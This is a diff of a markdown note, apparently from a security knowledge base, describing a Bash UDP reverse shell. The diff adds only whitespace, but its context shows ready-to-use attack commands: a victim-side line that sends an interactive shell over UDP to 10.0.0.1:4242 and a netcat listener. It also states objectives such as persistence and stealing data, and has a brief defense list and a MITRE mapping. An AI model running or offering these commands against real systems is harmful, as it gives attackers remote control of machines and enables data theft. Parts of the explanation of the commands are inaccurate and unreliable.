@@ -31,6 +31,8 @@ A Bash UDP Reverse Shell is a technique used to establish a reverse shell connec
 
 A Bash UDP Reverse Shell is a technique used to establish a reverse shell connection between an attacker and a target machine. This technique involves sending a UDP packet from the target machine to the attacker's machine, which contains a bash command to establish a reverse shell connection. This technique can be used to bypass firewalls and other network security measures that may be in place. The business value of this technique is that it allows an attacker to gain remote access to a target machine and potentially steal sensitive data or perform other malicious actions.
 
+ 
+
 ## Requirements
 
 1. Access to a target machine with Bash installed
@@ -38,6 +40,8 @@ A Bash UDP Reverse Shell is a technique used to establish a reverse shell connec
 1. Ability to send and receive UDP packets
 
 1. Knowledge of the target machine's IP address and open UDP port
+
+ 
 
 ## Defense
 
@@ -47,6 +51,8 @@ A Bash UDP Reverse Shell is a technique used to establish a reverse shell connec
 
 1. Regularly update and patch software to prevent known vulnerabilities from being exploited
 
+ 
+
 ## Objectives
 
 1. Establish a reverse shell connection between an attacker and a target machine
@@ -54,6 +60,8 @@ A Bash UDP Reverse Shell is a technique used to establish a reverse shell connec
 1. Maintain persistence on a target machine
 
 1. Steal sensitive data or perform other malicious actions on a target machine
+
+ 
 
 # Instructions
 
@@ -65,12 +73,20 @@ Then, on the attacker machine, run the following command to listen for the conne
 
 nc -u -lvp 4242
 
+ 
+
+
+
 **Code**: [[Victim:
 sh -i >& /dev/udp/10.0.0.1/4242 0>&1
 
 List]]
 
+
+
 > This command creates a reverse shell connection between the victim and attacker machines via UDP protocol. The 'sh' command is used to spawn a shell on the victim machine, which is then redirected to the specified IP address and port number using the '>&' operator. The '0>&1' operator is used to redirect the standard input, output, and error streams to the spawned shell. On the attacker machine, the 'nc' command is used to listen for the incoming connection from the victim machine. The '-u' option specifies that the connection should use UDP protocol, while '-lvp' specifies the port number to listen on and enables verbose output.
+
+
 
 **Command** ([[Reverse Shell]]):
 
@@ -78,11 +94,17 @@ List]]
 sh -i >& /dev/udp/10.0.0.1/4242 0>&1
 ```
 
+
+
+
+
 **Command** ([[Listener]]):
 
 ```bash
 nc -u -lvp 4242
 ```
+
+
 
 ## MITRE ATT&CK Mapping
 
@@ -104,3 +126,5 @@ nc -u -lvp 4242
 - [[Bash UDP]]
 - [[Reverse Shell]]
 - [[Reverse Shell Cheat Sheet]]
+
+
